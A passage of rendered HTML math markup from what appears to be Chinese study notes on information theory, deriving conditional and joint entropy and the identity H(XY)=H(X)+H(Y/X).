class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-2.3181em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span><span style="top:1.0471em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.4123em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>显然的，因为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>&lt;</mo><mi>p</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(a_ib_i)&lt;p(a_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(a_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>对于<strong>联合熵</strong>，也是一样的做法。而且类似于联合信息量，和单独的信源熵和条件信源熵有关</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mi>p</mi></mrow><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mrow><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo>−</mo></mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo fence="true">)</mo></mrow><mo>+</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>Y</mi><mi mathvariant="normal">/</mi><mi>X</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>Y</mi><mo fence="true">)</mo></mrow><mo>+</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mi mathvariant="normal">/</mi><mi>Y</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*}&amp;H(XY)=\sum_{i=1}^n{\sum_{j=1}^m{p}}\left( a_ib_j \right) I\left( a_ib_j \right) =-\sum_{i=1}^n{\sum_{j=1}^m{p\left( a_i \right) p\left( b_j|a_i \right) \log _2p\left( a_i \right) p\left( b_j|a_i \right)}}\\&amp;=-\sum_{i=1}^n{\sum_{j=1}^m{p\left( a_i \right) p\left( b_j|a_i \right) \log _2p\left( a_i \right)}}-\sum_{i=1}^n{\sum_{j=1}^m{p\left( a_i \right) p\left( b_j|a_i \right) \log _2p\left( b_j|a_i \right)}}\\&amp;=-\sum_{i=1}^n{p\left( a_i \right) \log _2p\left( a_i \right)-}\sum_{i=1}^n{\sum_{j=1}^m{p\left( a_ib_i \right) \log _2p\left( b_j|a_i \right)}}\\&amp;=H\left( X \right) +H\left( Y/X \right)\\&amp;=H\left( Y \right) +H\left( X/Y \right)\end{align*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:13.0955em;vertical-align:-6.2978em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.7978em;"><span style="top:-8.7978em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span><span style="top:-5.4326em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span><span style="top:-2.0674em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span><span style="top:0.4864em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span><span style="top:1.9864em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.2978em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.7978em;"><span style="top:-8.7978em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 